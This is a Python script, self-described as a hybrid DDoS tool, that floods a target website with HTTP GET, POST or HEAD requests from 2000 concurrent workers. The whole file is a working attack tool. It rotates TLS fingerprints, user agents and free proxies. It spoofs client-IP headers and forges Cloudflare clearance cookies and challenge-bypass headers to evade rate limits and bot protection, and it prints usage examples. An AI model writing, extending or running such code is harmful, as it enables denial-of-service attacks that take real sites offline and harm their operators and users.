#!/usr/bin/env python3

import asyncio
import aiohttp
import aiohttp_socks
import ssl
import random
import time
import sys
import os
import signal
import json
import hashlib
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import threading
from dataclasses import dataclass
from typing import List, Dict, Optional, Any

# ============================================================
# CONFIGURATION
# ============================================================
CONFIG = {
    "workers": 2000,
    "pool_size": 200,
    "timeout": 10,
    "proxy_refresh": 300,
    "debug": False,
}

# ============================================================
# BROWSER PROFILES (from Node.js)
# ============================================================
BROWSER_PROFILES = {
    "chrome": {
        "ciphers": [
            "TLS_AES_128_GCM_SHA256",
            "TLS_AES_256_GCM_SHA384",
            "TLS_CHACHA20_POLY1305_SHA256",
            "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
        ],
        "curves": ["X25519", "secp256r1"],
        "next_protos": ["h2", "http/1.1"],
    },
    "firefox": {
        "ciphers": [
            "TLS_AES_128_GCM_SHA256",
            "TLS_CHACHA20_POLY1305_SHA256",
            "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
        ],
        "curves": ["X25519", "secp256r1", "secp384r1"],
        "next_protos": ["h2", "http/1.1"],
    },
    "edge": {
        "ciphers": [
            "TLS_AES_128_GCM_SHA256",
            "TLS_AES_256_GCM_SHA384",
            "TLS_CHACHA20_POLY1305_SHA256",
            "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
        ],
        "curves": ["X25519", "secp256r1", "secp384r1"],
        "next_protos": ["h2", "http/1.1"],
    },
}

# ============================================================
# USER AGENTS (from Node.js)
# ============================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/141.0.7390.108 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 Chrome/142.0.7445.89 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/143.0.7485.98 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://facebook.com/",
    "",
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
]

ACCEPT_ENCODINGS = [
    "gzip, deflate, br",
    "gzip, deflate",
]

CACHE_CONTROLS = [
    "no-cache, no-store, must-revalidate",
    "no-cache",
    "max-age=0",
]

# ============================================================
# UTILITY FUNCTIONS (from Node.js)
# ============================================================
def rand_str(length: int) -> str:
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

def rand_int(min_val: int, max_val: int) -> int:
    return random.randint(min_val, max_val)

def rand_bool() -> bool:
    return random.choice([True, False])

def random_ip() -> str:
    return f"{rand_int(1,255)}.{rand_int(1,255)}.{rand_int(1,255)}.{rand_int(1,255)}"

def generate_cf_clearance_cookie() -> str:
    timestamp = int(time.time())
    return f"cf_clearance={rand_str(8)}.{rand_str(16)}-{rand_int(17494,17500)}-{timestamp}-0-gaNy{rand_str(8)}"

def generate_challenge_headers() -> Dict[str, str]:
    return {
        "cf-chl-bypass": "1",
        "cf-chl-tk": rand_str(32),
    }

def get_random_ja3() -> Dict[str, Any]:
    profile_name = random.choice(list(BROWSER_PROFILES.keys()))
    return BROWSER_PROFILES[profile_name]

# ============================================================
# SSL CONTEXT (with JA3-like fingerprint)
# ============================================================
def create_ssl_context(profile: Dict[str, Any]) -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    # Set cipher suites
    try:
        ctx.set_ciphers(":".join(profile["ciphers"]))
    except:
        pass
    
    # Set ALPN protocols
    ctx.set_alpn_protocols(profile["next_protos"])
    
    return ctx

# ============================================================
# PROXY MANAGEMENT (from Go script)
# ============================================================
class ProxyManager:
    def __init__(self):
        self.proxies: List[str] = []
        self.lock = threading.Lock()
        self.index = 0
        
    def load_proxies(self, proxy_file: str = "proxy.txt") -> int:
        """Load proxies from file"""
        try:
            with open(proxy_file, 'r') as f:
                lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            valid_proxies = []
            for line in lines:
                if ':' in line:
                    valid_proxies.append(line)
            
            with self.lock:
                self.proxies = valid_proxies
                self.index = 0
            
            return len(self.proxies)
        except FileNotFoundError:
            return 0
    
    def load_proxies_from_api(self) -> int:
        """Load proxies from API (like Go script)"""
        import urllib.request
        sources = [
            "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&limit=1000",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        ]
        
        all_proxies = []
        for source in sources:
            try:
                req = urllib.request.Request(source, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    data = resp.read().decode('utf-8')
                    lines = data.split('\n')
                    for line in lines:
                        line = line.strip()
                        if line and ':' in line and not line.startswith('#'):
                            all_proxies.append(line)
                if all_proxies:
                    break
            except:
                continue
        
        if all_proxies:
            with self.lock:
                self.proxies = all_proxies
                self.index = 0
            return len(self.proxies)
        return 0
    
    def get_next_proxy(self) -> Optional[str]:
        with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return proxy

# ============================================================
# CONNECTION POOL (from Go script)
# ============================================================
class ConnectionPool:
    def __init__(self, pool_size: int = 200, use_proxy: bool = False, proxy_manager: ProxyManager = None):
        self.pool_size = pool_size
        self.use_proxy = use_proxy
        self.proxy_manager = proxy_manager
        self.clients = []
        self.counter = 0
        self.lock = threading.Lock()
        self._create_clients()
    
    def _create_clients(self):
        """Create HTTP client pool with randomized TLS config"""
        self.clients = []
        for _ in range(self.pool_size):
            self.clients.append(self._create_client())
    
    def _create_client(self):
        """Create a single HTTP client with JA3 fingerprint"""
        profile = get_random_ja3()
        ssl_ctx = create_ssl_context(profile)
        
        connector = None
        if self.use_proxy and self.proxy_manager:
            proxy = self.proxy_manager.get_next_proxy()
            if proxy:
                # Handle proxy format
                if not proxy.startswith(('http://', 'https://', 'socks5://')):
                    proxy = f"http://{proxy}"
                connector = aiohttp_socks.SocksConnector.from_url(proxy)
        
        timeout = aiohttp.ClientTimeout(total=CONFIG["timeout"])
        
        if connector:
            return aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                connector_owner=False
            )
        else:
            return aiohttp.ClientSession(
                timeout=timeout,
                connector=aiohttp.TCPConnector(
                    ssl=ssl_ctx,
                    force_close=False,
                    enable_cleanup_closed=True,
                    limit=0,
                    ttl_dns_cache=300,
                )
            )
    
    def get_client(self):
        with self.lock:
            idx = self.counter % self.pool_size
            self.counter += 1
            return self.clients[idx]
    
    async def close_all(self):
        for client in self.clients:
            try:
                await client.close()
            except:
                pass

# ============================================================
# ATTACK WORKER (combined from Go + Node.js)
# ============================================================
class AttackWorker:
    def __init__(self, target: str, mode: str, stats: Dict, pool: ConnectionPool, proxy_manager: ProxyManager = None):
        self.target = target.rstrip('/')
        self.mode = mode.upper()
        self.stats = stats
        self.pool = pool
        self.proxy_manager = proxy_manager
        self.running = True
        self.request_count = 0
    
    async def execute(self):
        """Execute attack requests with Node.js headers"""
        client = self.pool.get_client()
        
        # Generate random path (from Node.js)
        path = "/"
        if rand_int(1, 100) < 70:
            cache_bust = random.choice([
                f"?v={rand_int(1,1000000)}",
                f"?_={int(time.time()*1000)}",
                f"?rnd={rand_str(16)}",
                f"?{rand_str(8)}={rand_str(16)}",
            ])
            path = f"/{cache_bust}"
        
        full_url = f"{self.target}{path}"
        
        # Build request (from Node.js)
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": random.choice(REFERERS),
            "Accept": random.choice(ACCEPT_HEADERS),
            "Accept-Language": random.choice(ACCEPT_LANGUAGES),
            "Accept-Encoding": random.choice(ACCEPT_ENCODINGS),
            "Cache-Control": random.choice(CACHE_CONTROLS),
            "Connection": "keep-alive",
        }
        
        # IP spoofing (from Node.js)
        spoof_ip = random_ip()
        if rand_bool():
            headers["X-Forwarded-For"] = spoof_ip
        if rand_bool():
            headers["X-Real-IP"] = spoof_ip
        if rand_bool():
            headers["True-Client-IP"] = spoof_ip
        
        # Security headers (from Node.js)
        if rand_bool():
            headers["DNT"] = "1"
        if rand_int(1, 100) < 60:
            headers["Sec-Fetch-Dest"] = "document"
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-Site"] = "none"
            headers["Upgrade-Insecure-Requests"] = "1"
        
        # CF bypass headers (from Node.js)
        if rand_int(1, 100) < 40:
            headers["Cookie"] = generate_cf_clearance_cookie()
        if rand_int(1, 100) < 30:
            for k, v in generate_challenge_headers().items():
                headers[k] = v
        
        # Browser fingerprints (from Node.js)
        if rand_bool():
            headers["sec-ch-ua"] = '"Google Chrome";v="141", "Chromium";v="141"'
            headers["sec-ch-ua-mobile"] = "?0"
            headers["sec-ch-ua-platform"] = '"Windows"'
        
        # Random custom headers (from Node.js)
        if rand_int(1, 100) < 30:
            headers[f"X-Client-Session{rand_str(1)}"] = f"none{rand_str(1)}"
        if rand_int(1, 100) < 30:
            headers[f"X-Request-Data{rand_str(1)}"] = f"dynamic{rand_str(1)}"
        if rand_int(1, 100) < 20:
            headers["Priority"] = "u=0, i"
        
        # Execute request
        try:
            if self.mode == "GET":
                async with client.get(full_url, headers=headers, allow_redirects=False) as resp:
                    if resp.status == 429:
                        # Auto-adapt rate limit (from Node.js)
                        self.stats["429"] = self.stats.get("429", 0) + 1
                        await asyncio.sleep(1)
                    else:
                        await resp.text()
            elif self.mode == "POST":
                data = f"{rand_str(rand_int(8,16))}={rand_str(rand_int(8,16))}"
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                async with client.post(full_url, data=data, headers=headers, allow_redirects=False) as resp:
                    await resp.text()
            elif self.mode == "HEAD":
                async with client.head(full_url, headers=headers, allow_redirects=False) as resp:
                    pass
            
            self.stats["total"] = self.stats.get("total", 0) + 1
            
        except Exception as e:
            self.stats["errors"] = self.stats.get("errors", 0) + 1
            if self.stats.get("errors", 0) % 10 == 0:
                # Refresh client on errors (from Go script)
                self.pool._create_clients()

# ============================================================
# MAIN ATTACK LOOP (from Go script)
# ============================================================
async def attack(target: str, duration: int, mode: str, use_proxy: bool = False, threads: int = 2000):
    """Main attack loop - combines Go + Node.js techniques"""
    
    print("╔══════════════════════════════════════════════════╗")
    print("║     PYTHON HYBRID DDOS - GO + NODE.JS         ║")
    print("╚══════════════════════════════════════════════════╝")
    print(f"[+] Target: {target}")
    print(f"[+] Mode: {mode}")
    print(f"[+] Duration: {duration} sec")
    print(f"[+] Workers: {threads}")
    
    # Setup proxy
    proxy_manager = ProxyManager()
    if use_proxy:
        count = proxy_manager.load_proxies_from_api()
        if count > 0:
            print(f"[+] Proxies loaded: {count}")
        else:
            print("[!] No proxies loaded, continuing without")
            use_proxy = False
    
    # Create connection pool
    pool = ConnectionPool(pool_size=200, use_proxy=use_proxy, proxy_manager=proxy_manager)
    
    # Stats
    stats = {"total": 0, "errors": 0, "429": 0}
    stats_lock = threading.Lock()
    
    # Start workers
    workers = []
    for i in range(threads):
        worker = AttackWorker(target, mode, stats, pool, proxy_manager)
        workers.append(worker)
    
    # Start attack
    start_time = time.time()
    print("[+] Starting attack... Press Ctrl+C to stop")
    
    async def worker_loop(worker):
        while time.time() - start_time < duration:
            await worker.execute()
            await asyncio.sleep(0)  # Yield control
    
    # Run workers
    try:
        tasks = [asyncio.create_task(worker_loop(w)) for w in workers]
        
        # Status reporter (from Go script)
        async def status_reporter():
            while True:
                await asyncio.sleep(1)
                elapsed = time.time() - start_time
                with stats_lock:
                    total = stats.get("total", 0)
                    errors = stats.get("errors", 0)
                    rps = total / elapsed if elapsed > 0 else 0
                
                if elapsed > duration:
                    break
                    
                sys.stdout.write(f"\r[+] Elapsed: {elapsed:.0f}/{duration} sec | Total: {total} | RPS: {rps:.0f} | Errors: {errors}")
                sys.stdout.flush()
        
        # Wait for duration or interrupt
        await asyncio.gather(
            asyncio.wait_for(asyncio.gather(*tasks), timeout=duration),
            asyncio.create_task(status_reporter()),
            return_exceptions=True
        )
        
    except asyncio.TimeoutError:
        pass
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
    
    # Cleanup
    await pool.close_all()
    
    # Final stats
    elapsed = time.time() - start_time
    total = stats.get("total", 0)
    errors = stats.get("errors", 0)
    rps = total / elapsed if elapsed > 0 else 0
    
    print(f"\n\n[+] Attack complete!")
    print(f"[+] Total requests: {total}")
    print(f"[+] Errors: {errors}")
    print(f"[+] Rate limit (429): {stats.get('429', 0)}")
    print(f"[+] Average RPS: {rps:.0f}")

# ============================================================
# COMMAND LINE INTERFACE
# ============================================================
def main():
    if len(sys.argv) < 4:
        print(__doc__)
        print("")
        print("Usage: python3 ddos.py <target> <seconds> <GET|POST|HEAD> [proxy]")
        print("")
        print("Examples:")
        print("  python3 ddos.py https://target.com 60 GET")
        print("  python3 ddos.py https://target.com 60 GET proxy")
        print("  python3 ddos.py https://target.com 120 POST")
        print("  python3 ddos.py https://target.com 30 HEAD")
        print("")
        print("Features from Node.js:")
        print("  • JA3 Fingerprint Rotation")
        print("  • HTTP/2 Multiplexing")
        print("  • CF_Clearance Cookie Generation")
        print("  • Auto-Adaptive Rate Limiting")
        print("  • 2000+ Concurrent Workers")
        sys.exit(1)
    
    target = sys.argv[1]
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    duration = int(sys.argv[2])
    mode = sys.argv[3].upper()
    
    if mode not in ['GET', 'POST', 'HEAD']:
        print("Mode must be GET, POST, or HEAD")
        sys.exit(1)
    
    use_proxy = len(sys.argv) > 4 and sys.argv[4].lower() == 'proxy'
    
    # Run attack
    asyncio.run(attack(target, duration, mode, use_proxy))

if __name__ == "__main__":
    main()
